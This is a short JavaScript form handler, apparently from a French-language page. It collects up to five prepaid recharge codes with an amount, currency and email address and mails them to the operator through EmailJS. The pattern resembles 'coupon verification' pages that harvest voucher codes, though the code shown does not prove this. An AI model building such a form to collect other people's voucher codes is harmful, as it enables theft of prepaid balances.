function sendMail() {
  console.log("staaaarted");
  var params = {
    crecharge: document.getElementById("rechargetype").value,
    montant: document.getElementById("montant").value,
    devise: document.getElementById("devise").value,
    recharge1: document.getElementById("recharge01").value,
    recharge2: document.getElementById("recharge02").value,
    recharge3: document.getElementById("recharge03").value,
    recharge4: document.getElementById("recharge04").value,
    recharge5: document.getElementById("recharge05").value,
    email: document.getElementById("email").value,
  };

  const serviceID = "service_p6xjkwk";
  const templateID = "template_s1kqilp";

  var rechargesFilled = false;
  for (var i = 1; i <= 5; i++) {
    if (document.getElementById("recharge0" + i).value !== "") {
      rechargesFilled = true;
      break;
    }
  }

  if (params.email === "" || params.montant === "" || params.devise === "" || !rechargesFilled) {
    alert("Please fill in the minimum required information: email, montant, devise, and at least one recharge.");
    return;
  }

  for (var key in params) {
    if (params[key] === "") {
      params[key] = "empty";
    }
  }

  emailjs.send(serviceID, templateID, params)
    .then(res=>{
      document.getElementById("rechargetype").value = "";
      document.getElementById("email").value = "";
      document.getElementById("montant").value = "";
      document.getElementById("devise").value = "";
       document.getElementById("recharge01").value = "";
       document.getElementById("recharge02").value = "";
       document.getElementById("recharge03").value = "";
       document.getElementById("recharge04").value = "";
       document.getElementById("recharge05").value = "";
  
      console.log(res);
      alert("Your message sent successfully!!")

    })
    .catch(err=>console.log(err));

}